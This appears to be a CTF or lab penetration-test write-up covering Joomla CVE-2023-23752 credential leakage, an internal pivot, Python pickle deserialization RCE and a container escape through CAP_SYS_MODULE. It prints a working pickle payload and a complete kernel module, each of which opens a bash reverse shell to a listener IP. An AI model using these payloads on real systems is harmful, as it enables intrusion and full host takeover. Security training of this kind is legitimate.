2. Initial Access (CVE-2023-23752)

Analyzing the Joomla installation revealed version Joomla 4.2.7, which is vulnerable to an authentication bypass flaw (CVE-2023-23752).

Exploiting this flaw allowed us to leak database credentials. Testing these credentials against SSH on port 22 failed, but succeeded on port 2222 with RootPassword@1234.

Upon logging in, checking environment variables confirmed we were inside a Docker container:

3. Internal Pivot & Python Deserialization RCE

Scanning the internal subnet 192.168.100.0/24 from the container revealed three active hosts:

IP Address Role / Details Open Ports
192.168.100.1 Host / Main Server 22, 80, 2222, 5000
192.168.100.10 Current Container 22 (Ubuntu 20.04)
192.168.100.12 Internal Flask App 5000 (Werkzeug/3.1.3)

By establishing SSH local port forwarding, we forwarded port 5000 to inspect requests via Burp Suite. The Flask application stored user sessions using serialized Python cookies:

session_data=80049525000000000000007d94288c04...

Since the application relies on pickle.loads() to deserialize this session cookie, we generated an exploit payload for Remote Code Execution:

import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "/bin/bash -i >& /dev/tcp/192.168.216.29/4444 0>&1"',))

if __name__ == '__main__':
    print(binascii.hexlify(pickle.dumps(Exploit())))

Injecting the generated cookie payload granted us a secondary reverse shell in a separate internal container context.

4. Container Escape via CAP_SYS_MODULE

Running LinPEAS inside the new container highlighted a critical capability assigned to the container: CAP_SYS_MODULE.

This capability allows inserting Arbitrary Kernel Modules (LKM) directly into the running host system's kernel space.

We created a custom C kernel module pointing a reverse shell back to our listener host:

#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");

char* argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

We targeted kernel headers present at /lib/modules/6.8.0-1030-aws/build, compiled rev.ko using a custom Makefile, and executed insmod rev.ko.

The kernel module executed immediately in host space, escalating privileges from the container context to full **Root** access on the host node.
